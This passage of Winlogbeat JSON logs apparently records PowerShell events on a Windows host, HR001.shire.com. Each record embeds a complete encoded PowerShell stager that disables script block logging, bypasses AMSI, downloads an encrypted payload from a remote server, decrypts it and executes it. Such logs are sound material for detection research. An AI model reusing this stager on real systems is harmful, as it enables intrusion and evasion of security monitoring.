{"@timestamp":"2019-05-18T20:42:59.049Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"activity_id":"{c93a7728-017f-0000-a5fe-49ca7f01d501}","process_id":5452,"computer_name":"HR001.shire.com","message":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71003\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","thread_id":3896,"host":{"name":"WECserver"},"opcode":"To be used when operation is just executing a method","level":"Information","log_name":"Microsoft-Windows-PowerShell/Operational","event_id":4103,"provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71003\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\""},"user":{"identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha","domain":"SHIRE","type":"User"},"version":1,"type":"wineventlog","record_number":"92756","task":"Executing Pipeline","source_name":"Microsoft-Windows-PowerShell","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"}}
{"@timestamp":"2019-05-18T20:42:59.050Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"thread_id":3896,"event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4A